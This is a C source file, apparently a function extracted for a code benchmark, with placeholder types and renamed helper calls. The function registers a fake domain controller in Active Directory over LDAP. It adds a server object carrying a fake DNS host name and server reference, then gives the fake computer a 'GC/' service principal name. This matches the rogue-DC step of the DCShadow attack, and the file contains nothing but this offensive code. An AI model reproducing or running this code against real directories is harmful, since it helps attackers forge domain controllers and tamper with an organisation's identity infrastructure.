#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_9__   TYPE_3__ ;
typedef  struct TYPE_8__   TYPE_2__ ;
typedef  struct TYPE_7__   TYPE_1__ ;

/* Type definitions */
struct TYPE_7__ {char** modv_strvals; } ;
struct TYPE_9__ {char* mod_type; TYPE_1__ mod_vals; void* mod_op; int /*<<< orphan*/  member_0; } ;
struct TYPE_8__ {char* szFakeFQDN; char* szFakeDN; char* szFakeDCNetBIOS; int /*<<< orphan*/  ld; int /*<<< orphan*/  szDomainName; int /*<<< orphan*/  szDsServiceName; } ;
typedef  char* PWSTR ;
typedef  TYPE_2__* PDCSHADOW_DOMAIN_INFO ;
typedef  TYPE_3__ LDAPMod ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FALSE ; 
 void* LDAP_MOD_ADD ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  TRUE ; 
 scalar_t__ FUNC2 (char**,char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,TYPE_3__**) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,TYPE_3__**) ; 

BOOL FUNC5(PDCSHADOW_DOMAIN_INFO info)
{
	BOOL fSuccess = FALSE;
	DWORD dwErr = 0;
	LDAPMod ldapmodOC = {0};
	LDAPMod ldapmodDNS = {0};
	LDAPMod ldapmodServerReference = {0};
	LDAPMod *ldapmods[] = {&ldapmodOC, &ldapmodDNS, &ldapmodServerReference, NULL};
	PWSTR szDN;
	PWSTR szValsOC[] = {L"server", NULL};
	PWSTR szValsDNS[] = {info->szFakeFQDN, NULL};
	PWSTR szValsServerReference[] = {info->szFakeDN, NULL};
	PWSTR szSPNAttribute[] = {NULL, NULL};
	LDAPMod ldapmodSPN = {0};
	LDAPMod *ldapmodServer[] = {&ldapmodSPN, NULL};
	
	// add computer object
	ldapmodOC.mod_op = LDAP_MOD_ADD;
	ldapmodOC.mod_type = L"objectClass";
	ldapmodOC.mod_vals.modv_strvals = szValsOC;
	ldapmodDNS.mod_op = LDAP_MOD_ADD;
	ldapmodDNS.mod_type = L"dNSHostName";
	ldapmodDNS.mod_vals.modv_strvals = szValsDNS;
	ldapmodServerReference.mod_op = LDAP_MOD_ADD;
	ldapmodServerReference.mod_type = L"serverReference";
	ldapmodServerReference.mod_vals.modv_strvals = szValsServerReference;
	
	ldapmodSPN.mod_op = LDAP_MOD_ADD;
	ldapmodSPN.mod_type = L"servicePrincipalName";
	ldapmodSPN.mod_vals.modv_strvals = szSPNAttribute;

	if(FUNC2(&szDN, L"CN=%s%s", info->szFakeDCNetBIOS, info->szDsServiceName))
	{
		if(FUNC2(szSPNAttribute, L"GC/%s/%s", info->szFakeFQDN, info->szDomainName))
		{
			if(!(dwErr = FUNC3(info->ld, szDN, ldapmods)))
			{
				if(!(dwErr = FUNC4(info->ld, info->szFakeDN, ldapmodServer)))
					fSuccess = TRUE;
				else FUNC1(L"ldap_modify_s computer SPN 0x%x (%u)\n", dwErr, dwErr);
			}
			else FUNC1(L"ldap_add_s computer object 0x%x (%u)\n", dwErr, dwErr);
			FUNC0(szSPNAttribute[0]);
		}
		FUNC0(szDN);
	}
	return fSuccess;
}